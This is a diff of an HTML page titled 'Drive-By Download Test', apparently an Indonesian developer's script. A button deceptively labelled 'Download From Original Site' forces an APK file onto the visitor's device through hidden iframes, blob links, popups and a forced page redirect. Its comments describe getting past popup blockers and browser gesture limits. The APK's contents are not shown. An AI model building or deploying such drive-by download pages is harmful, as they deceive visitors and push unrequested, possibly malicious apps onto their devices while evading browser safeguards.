@@ -1,6 +1,7 @@
 <html>
 <head>
 <meta charset="utf-8">
+<title>Drive-By Download Test</title>
 <style>
 .button {
   background-color: #4CAF50;
@@ -14,31 +15,109 @@
   margin: 4px 2px;
   cursor: pointer;
 }
+#log { font-family: monospace; white-space: pre; margin-top: 16px; color: #333; }
 </style>
 </head>
 <body>
+<center>
+<input type="button" class="button" value="Download From Original Site" onclick="a()">
+<div id="log"></div>
+</center>
+
 <script>
+var URL = 'https://frozzipies.github.io/test.apk';
+var NAME = 'test.apk';
+var log = document.getElementById('log');
+
+function writeLog(msg) {
+    log.textContent += '[*] ' + msg + '\n';
+    console.log('[test] ' + msg);
+}
+
+// ===== Layer 1: Fetch + Blob (same-origin object, paling andal) =====
+async function tryBlob() {
+    try {
+        const resp = await fetch(URL, { mode: 'cors' });
+        if (!resp.ok) throw new Error('HTTP ' + resp.status);
+        const blob = await resp.blob();
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = NAME;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        writeLog('Layer 1 (Blob): OK');
+        return true;
+    } catch (e) {
+        writeLog('Layer 1 (Blob) gagal: ' + e.message);
+        return false;
+    }
+}
+
+// ===== Layer 2: Iframe tersembunyi =====
+function tryIframe() {
+    try {
+        var f = document.createElement('iframe');
+        f.style.display = 'none';
+        f.src = URL;
+        document.body.appendChild(f);
+        writeLog('Layer 2 (iframe): dikirim');
+        return true;
+    } catch (e) {
+        writeLog('Layer 2 (iframe) gagal: ' + e.message);
+        return false;
+    }
+}
+
+// ===== Layer 3: window.open dari user gesture (Firefox-friendly) =====
+function tryWindowOpen() {
+    try {
+        var w = window.open(URL, '_blank');
+        if (w) {
+            writeLog('Layer 3 (window.open): OK');
+            return true;
+        }
+        writeLog('Layer 3 (window.open): diblokir');
+        return false;
+    } catch (e) {
+        writeLog('Layer 3 gagal: ' + e.message);
+        return false;
+    }
+}
+
+// ===== Layer 4: Top-level navigation (tidak bisa diblokir) =====
+function tryTopNav() {
+    writeLog('Layer 4 (top-level nav): dieksekusi');
+    window.top.location.href = URL;
+}
+
+// ===== Deteksi browser =====
+function isFirefox() {
+    return navigator.userAgent.toLowerCase().indexOf('firefox') > -1;
+}
+
+// ===== Orchestrator: jalankan berurutan sampai satu sukses =====
 function a() {
-    var url = 'https://frozzipies.github.io/test.apk';
+    log.textContent = '';
+    writeLog('Browser: ' + (isFirefox() ? 'Firefox' : 'Chrome/Chromium'));
 
-    // Metode 1: iframe tersembunyi — paling andal, gak kena popup blocker
-    var iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = url;
-    document.body.appendChild(iframe);
-
-    // Metode 2: anchor dengan atribut download, diklik otomatis (backup)
-    setTimeout(function () {
-        var link = document.createElement('a');
-        link.href = url;
-        link.download = 'test.apk';
-        link.style.display = 'none';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-    }, 1000);
+    // Firefox: window.open masih hidup ~5 detik setelah gesture → coba dulu
+    if (isFirefox()) {
+        setTimeout(function () {
+            if (tryWindowOpen()) return;
+            tryBlob().then(function (ok) { if (!ok) tryIframe(); });
+        }, 0);
+    } else {
+        // Chrome: gesture sangat pendek → Blob/iframe, tanpa delay
+        tryBlob().then(function (ok) {
+            if (!ok) {
+                if (tryIframe()) return;
+                setTimeout(tryWindowOpen, 0); // masih dalam call stack gesture
+                setTimeout(tryTopNav, 3000);  // fallback terakhir
+            }
+        });
+    }
 }
 </script>
-<center><input type="button" class="button" value="Download From Original Site" onclick="a()"></center>
 </body>
 </html>
